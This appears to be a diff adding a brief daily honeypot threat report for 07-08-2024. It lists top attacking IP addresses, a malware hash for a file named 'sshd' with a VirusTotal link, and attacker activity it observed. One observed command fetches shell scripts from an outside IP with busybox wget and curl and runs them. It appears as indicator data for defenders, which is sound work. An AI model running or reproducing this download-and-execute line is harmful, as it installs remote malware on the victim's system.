@@ -1,0 +1,30 @@
+Top 5 IPs for 07-08-2024 :
+
+183.90.172.226
+82.151.65.155
+217.254.248.182
+159.223.50.96
+180.103.155.109
+
+
+
+Malware Observed:
+
+File Name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+
+Commands/exploits observed:
+
+
+cd /data/local/tmp/; busybox wget http://107.173.35.192/w.sh; sh w.sh; curl http://107.173.35.192/c.sh; sh c.sh
+
+
+GET / HTTP/1.1
+User-Agent: Wget/1.20.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: <Host IP>
+Connection: Keep-Alive
